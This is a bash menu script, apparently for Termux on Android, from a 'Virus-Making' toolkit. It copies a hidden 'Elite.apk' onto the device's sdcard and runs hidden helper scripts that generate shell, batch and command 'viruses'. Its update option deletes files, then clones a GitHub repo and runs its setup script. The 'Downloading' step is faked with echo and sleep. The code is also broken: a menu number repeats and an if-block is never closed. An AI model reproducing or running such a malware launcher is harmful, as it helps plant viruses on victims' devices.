clear
lal="\033[91m"
figlet Virus | toilet -f term -F gay
echo
echo -e "	\033[91m [ 1 ]\033[93m Elite.apk "
echo -e "	\033[91m [ 2 ]\033[93m Shell virus$lal ( 9)"
echo -e "	\033[91m [ 3 ]\033[93m Batch virus$lal ( 6 )"
echo -e "	\033[91m [ 4 ]\033[93m Command Virus$lal ( 9 )"
echo -e "	\033[91m [ 5 ]\033[93m Update Tool"
echo -e "	\033[91m [ 4 ]\033[93m Exit"
echo 
echo -e -n "\033[96m Select >> "
read a
if [ "$a" = "1" ];then
clear
cd ~/‌Virus-Making
cp -f .Elite.apk /sdcard/Virus
cd /sdcard/Virus
mv .Elite.apk Elite.apk
echo -e "\033[93m Downloading Elite.apk......"
sleep 5
echo "Download Success"
sleep 2
echo "Checking......"
sleep 2
cd /sdcard/Virus
ls
pwd
echo
echo "Press enter for Home"
read
cd $PREFIX
bash .vir.sh
fi
if [ "$a" = "2" ];then
clear
cd $PREFIX
bash .shell.sh
fi
if [ "$a" = "3" ];then
cd $PREFIX
bash .bat.sh
fi
if [ "$a" = "4" ];then
cd $PREFIX
bash .command.sh
if [ "$a" = "5" ];then
clear
echo -e "$lal	[+] Updating ......"
echo
sleep 2
cd ~
rm -rf ‌Virus-Making
cd $PREFIX
rm -Rf .*.sh
apt install git
git clone https://github.com/rooted-cyber/Virus-Making
cd Virus-Making
bash setup.sh
fi